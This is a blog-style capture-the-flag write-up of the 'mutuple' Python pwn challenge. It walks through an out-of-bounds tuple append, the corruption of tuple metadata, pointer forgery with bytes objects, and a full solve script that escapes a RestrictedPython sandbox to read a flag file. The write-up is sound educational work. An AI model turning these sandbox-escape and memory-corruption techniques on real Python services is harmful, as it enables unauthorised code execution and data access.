---
layout: post
title: sctf/mutuple
date: 2025-11-18 05:40:00 +0800
---

recommended listening for this post is [ 明日にはすべてが終わるとして](https://www.youtube.com/watch?v=yuXaABIr0go&list=PL8Xbf2xl0OGBgCZw4kyzpulGkXN1f0ZQM&index=9) by kinokoteikoku.

![image](https://i.imgur.com/JIUaiNl.png)

[azazo](https://blog.azazo.me) and i did this ctf alongside one other friend. the event is long gone now but i decided to upsolve this python pwn challenge by [samuzora](https://samuzora.com) that i thought was really fun. it took me about 8 hours.

### pwn/mutuple

> I made tuples mutable... you can call them mutuples ecks dee
>
> by samuzora
>
> 0 solves

wah 0 solves fucking kena this one

the challenge introduces a custom `mutuple` library with an `append` function.

```c
#define PY_SSIZE_T_CLEAN
#include <python3.9/Python.h>

PyObject *PyInit_mutuple(void);

static PyObject *method_append(PyObject *, PyObject *);

PyMethodDef methods[] = { 
  {
    .ml_name = "append",
    .ml_meth = method_append,
    .ml_flags = METH_VARARGS
  }
};

PyModuleDef definition = {
  .m_name = "mutuple",
  .m_methods = methods,
};

PyObject *PyInit_mutuple() {
  PyModule_Create(&definition);
}

static PyObject *method_append(PyObject *self, PyObject *args) {
  PyTupleObject *the_tuple = NULL;
  PyObject *to_add = NULL;

  if (!PyArg_UnpackTuple(args, "ref", 2, 2, &the_tuple, &to_add)) {
    return NULL;
  }

  if (!PyTuple_Check(the_tuple)) {
    PyErr_SetString(PyExc_TypeError, "first argument must be of type tuple");
    return NULL;
  }

  the_tuple->ob_item[the_tuple->ob_base.ob_size++] = to_add;

  return Py_True;
}
```

### setup

getting this setup on your local machine is actually nontrivial, esp. if you want debug symbols on python (which are super nice to have due to the struct definitions being given for you). consulting the Dockerfile we can see that it's python 3.9, so let's get python 3.9 and compile it with debug symbols. the process for this is shown in my [rev/disthis writeup](https://slight-smile.com/writeups/infobahn-ctf-25/) over on the slight-smile website (check us out ^_^) so i won't belabor the point.

the key thing you'll want to do is copy the provided compiled library (with debug symbols also, bless u lucas) into the correct directory, in this case it's `/Python-3.9.0/build/lib.linux-x86_64-3.9-pydebug`.

```bash
navi@curette (.linux-x86_64-3.9-pydebug) > ls
array.cpython-39d-x86_64-linux-gnu.so             _opcode.cpython-39d-x86_64-linux-gnu.so
_asyncio.cpython-39d-x86_64-linux-gnu.so          ossaudiodev.cpython-39d-x86_64-linux-gnu.so
audioop.cpython-39d-x86_64-linux-gnu.so           parser.cpython-39d-x86_64-linux-gnu.so
binascii.cpython-39d-x86_64-linux-gnu.so          _pickle.cpython-39d-x86_64-linux-gnu.so
_bisect.cpython-39d-x86_64-linux-gnu.so           _posixshmem.cpython-39d-x86_64-linux-gnu.so
_blake2.cpython-39d-x86_64-linux-gnu.so           _posixsubprocess.cpython-39d-x86_64-linux-gnu.so
```

this is where all the library nonsense lies. we can verify that the library is installed by calling `from mutuple import *`, here is me demoing the functionality.

```python
>>> from mutuple import append
>>> a = (1,)
>>> append(a, 2)
True
>>> a
(1, 2)
```

lovely let's get on with the solve

### primitive: oob write of pointers

to be honest i didn't actually dig too deep into the source code itself, i just kept whacking in gdb until i got a crash. but to explain the functionality, there's no quote-unquote 'bounds' check as to the allocated area dedicated for the tuple, so if we keep appending to the given tuple, we'll inevitably overwrite some adjacent tuples.

a major problem and annoyance w/ python pwn is that python seems to allocate objects wherever the fuck it feels like, thus making offsets wildly inconsistent. you can have a working solve script that relies on a baked-in offset, keep making edits to it, and then it completely whacks up the offset. we circumvent this by allocating a bunch of tuples, checking the offsets of adjacent items in memory, and just hoping we get a nice number. here is some code that does exactly that, we just spray and pray and hope for two tuples at offset `0x50` from one another.

```py
vals = []
vm = lambda x: print_(hex(id(x)))

for i in range(10000):
    vals.append((i,))
    if i > 1:
        if id(vals[i]) - id(vals[i-1]) == 0x50:
            offset = i-1
            break

vm(vals[offset])
vm(vals[offset + 1])
input('...')
```

at this point in the challenge it behooves us to learn a bit more about the `PyTupleObject` struct as defined in `CPython`. lucas samuzora tan has a really good deep-dive into this on his author writeup for the challenge so i won't belabor the point, i'll just go over what is strictly necessary to solve the challenge. we'll get the address of one of our tuples and poke around in it in gdb.

again, note that compiling with symbols is _really_ nice because we can automatically resolve all these type definitions and struct formats.

```python
gef> p *(PyTupleObject*)0x7ffff755ce10
$1 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = 0x5555558fc020 <PyTuple_Type>
    },
    ob_size = 0x1
  },
  ob_item = {
    [0x0] = 0x7ffff7cb6380
  }
}
```

the important things here are `ob_size`, `ob_type`, and `ob_item`. `ob_size` is the number of items in the tuple, `ob_type` is a pointer to the `type` object in Python, and `ob_item` is an array containing pointers to everything in the tuple.

viewing the raw bytes and eyepowering the structs we can see the two tuples, almost side-by-side:

```python
gef> x/16x 0x7ffff759f820

[here is the first tuple]
0x7ffff759f820:	0x0000000000000001	0x00005555558fc020
0x7ffff759f830:	0x0000000000000001	0x00007ffff7cb3e40 <- [here is the first object]
0x7ffff759f840:	0xfdfdfdfdfdfdfdfd	0xdddddddddddddddd

[i have no idea what this nonsense is]
0x7ffff759f850:	0x3000000000000000	0xfdfdfdfdfdfdfd6f
0x7ffff759f860:	0x0000555555949fb0	0x00007ffff759f810

[here is the second tuple]
0x7ffff759f870:	0x0000000000000001	0x00005555558fc020
0x7ffff759f880:	0x0000000000000001	0x00007ffff7cb3e80
0x7ffff759f890:	0xfdfdfdfdfdfdfdfd	0xdddddddddddddddd
```

the tuples are basically almost kissing. given that each `.append()` occupies one qword, we can eyepower and see we need to append 6 qwords to get through all the garbage, and then our next `.append()` would start impacting struct metadata. we whack once to impact `ob_refcnt`, then another time to whack `ob_type`.

```python
for i in range(6):
    append(vals[offset], 'rawr')

append(vals[offset], 'woof') # <- now we whack the ob_refcnt, which doesnt do much
append(vals[offset], 'meow') # <- this one kena whack the ob_type

print_(type(vals[offset + 1]))
input('...')
```

running this, we'll see that our `type` for the second tuple is now altered.

```bash
starting the exploit...
0x7ff988963be0
0x7ff988963c30
tuple type >  meow
```

epic. an important caveat of this write is that we are currently unable to write arbitrary bytes, just pointers to objects. say, if we wanted to write nulls to some fields, we just couldn't, because no Python function is able to return a nullptr without erroring out.

so what do we do? given that we can still whack `ob_size`, we can create a tuple that's just, really fucking big:

```py
for i in range(6):
    append(vals[offset], 'rawr')

append(vals[offset], 'woof')
append(vals[offset], tuple) # <- we actually don't want to alter our struct's type here
append(vals[offset], 'meow') # <- this whacks the ob_size

vuln = vals[offset+1]
print_('tuple type > ', type(vuln))
print_('tuple size > ', len(vuln))
input('...')
```

a neat hack here is that if we want to get to `ob_size`, we'll naturally have to whack `ob_type`. we don't actually want to whack `ob_type`! but since we're able to write _pointers_, we have access to the `tuple` pointer by directly writing `tuple`.

this results in our huge tuple.

```bash
navi@curette (ves/pwn-mutuple/src/chall) > cp fuzz.py /tmp/fuzz.py; ./python run.py fuzz.py
starting the exploit...
0x7f3ccf0b0190
0x7f3ccf0b01e0
tuple type >  <class 'tuple'>
tuple size >  139899148097392
```

this is OOB read. the thing is, we still can't read raw bytes, because when we index into the tuple, it dereferences the pointer at that index of the `ob_item` array - it doesn't actually return the bytes themselves.

the question then becomes: how do we _forge_ bytes? in other python pwn a really handy tool is `bytearray`, but the challenge does not give us access to this :(

instead we can just write bytes, with, well, `bytes`. the `bytes` object actually does contain the raw bytes written to it as a contiguous section in one of its struct fields. let's demonstrate by creating a `bytes` object and analysing it.

```python
b = b'rawr rawr woof'
print_(hex(id(b)))
input('...')
```

hopping into gef:

```python
gef> p *(PyBytesObject*)0x7ffff755c8b0
$2 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x2,
      ob_type = 0x5555558ed400 <PyBytes_Type>
    },
    ob_size = 0xe
  },
  ob_shash = 0xb57bd7371431d8f2,
  ob_sval = "r"
}
```

the `ob_sval` field is what we want here. we can print this as a string and verify the bytes are there.

```python
gef> x/g (*(PyBytesObject*) 0x7ffff755c900)->ob_sval
0x7ffff755c920:	0x7761722072776172
gef> x/s (*(PyBytesObject*) 0x7ffff755c900)->ob_sval
0x7ffff755c920:	"rawr rawr woof"
```

so this becomes our handy primitive to create raw bytes. we'll use this to forge pointers to objects in the Python namespace - because we now have a really large tuple, as long as our forged tuple is _before_ our forged bytes object in memory, we can just access it by indexing into the tuple.

we will have to figure out something nice to forge. let's actually look at the set-up for the challenge (it accepts a base64 encoded .py file and runs it with severe restrictions > )

```python
#!/usr/bin/python3.9 -u
from mutuple import append
from sys import modules, argv
del modules['os']
keys = list(__builtins__.__dict__.keys())

from RestrictedPython import compile_restricted, safe_builtins
from RestrictedPython.Eval import default_guarded_getiter
from RestrictedPython.Guards import full_write_guard

from operator import getitem

def _inplacevar_(op, var, expr):
    if op == "+=":
            return var + expr
    elif op == "-=":
            return var - expr
    elif op == "*=":
        return var * expr
    elif op == "/=":
        return var / expr
    elif op == "%=":
        return var % expr
    elif op == "**=":
        return var ** expr
    elif op == "<<=":
        return var << expr
    elif op == ">>=":
        return var >> expr
    elif op == "|=":
        return var | expr
    elif op == "^=":
        return var ^ expr
    elif op == "&=":
        return var & expr
    elif op == "//=":
        return var // expr
    elif op == "@=":
        return var // expr

filename = argv[1]
with open(f"/tmp/{filename}", "r") as file:
    builtins = safe_builtins
    builtins["_getitem_"] = getitem
    builtins["_getiter_"] = default_guarded_getiter
    builtins["_inplacevar_"] = _inplacevar_
    builtins["_write_"] = full_write_guard
    builtins["bytes"] = bytes
    builtins["chr"] = chr
    builtins["input"] = input
    builtins["append"] = append
    builtins["ord"] = ord
    builtins["print_"] = print # allow printing in sandbox
    builtins["type"] = type
    print('starting the exploit...')
    exec(
        compile_restricted(file.read(), filename="<inline-code>", mode="exec"),
        {"__builtins__": builtins},
        None
    )
```

this specifically gates access to python's `builtins` and replaces it with a safer version. the thing is though, this `builtins` module _still exists_ in the memory, and we can find, reference, and forge a pointer to this module.

of course, we cannot directly reference it by calling `id()`, but since it's defined in the python heap somewhere (I Think), we can work off the assumption that it's a fixed offset other objects, and just subtract and add accordingly - this is similar to how actual C pwn works, of course (finding libc addresses, so on so forth).

the quote unquote 'reference' point i use is `id(0)`. to actually debug and find the offset i just patched in a reference to the `builtins` module in run.py as so:

```py
builtins["type"] = type
builtins["ref"] = __builtins__
```

then in the solve script, we run this a few times and make sure the offset is constant.

```py
vuln = vals[offset+1]
print_('offset to builtins > ', hex(id(0) - id(ref)))
```

all that's left to do is:

a - create a byte object whose bytestring is a pointer to builtins.

b - calculate the _offset_ from the byte object to our forged "big" tuple.

c - index into the tuple and retrieve our reference to builtins.

d - win!

now, this handwaves over a lot of concerns which a more competent pwner could've overcome in less than 10 minutes but i, level 2 mafia rookie, stumbled over for a few hours (making sure that the offsets are correctly calculated, making sure that the tuple is placed _before_ the bytestring, dynamically accommodating for essentialy 'random' offsets because python fucking hates me i guess).

but the solvepath is sound, and it does work. here is the full solvescript, for posterity:

```python
vals = []

for i in range(10000):
    vals.append((i,))
    if i > 1:
        if id(vals[i]) - id(vals[i-1]) == 0x30:
            offset = i-1
            break

for i in range(3):
    append(vals[offset], 'rawr xd')
append(vals[offset], tuple)
append(vals[offset], type)
append(vals[offset], str)
append(vals[offset], int)
append(vals[offset], complex)

vuln = vals[offset+1]
print_('offset to builtins > ', hex(id(0) - id(ref)))
print_('type of vuln >', type(vuln))
addr_to_write = id(0) - 0x38010

obj = addr_to_write.to_bytes(8, byteorder='little')

byte_overwrite = []

for i in range(1, 10000):
    f = b''
    for i in obj:
        f += i.to_bytes(1, 'big')
    byte_overwrite.append(f)
    offset = id(f) - id(vuln)
    if 0x1000 > offset > 0x0: 
        print_(hex(offset))
        break

f = byte_overwrite[-1]
target_idx = (id(f) - id(vuln) + 0x08) // 8
print_('target_idx > ', target_idx);
print_('target_addr >', addr_to_write)
a = vuln[target_idx].open("flag.txt").read()
print_(a)
```

### closing

funny story is that this challenge took me _really_ long to solve (around 8 hours) because i kept fucking up and making a bunch of mistakes. i had the primitive very early on and just spent so much time skillissuing on really trivial parts of the challenge :S

i wanted to make my solve libc-agnostic because i couldn't be bothered to properly figure out how the docker container treats its libcs, so i went with the pyjail-style `builtins` retrieval.

thanks to lucas for the fun pwn!
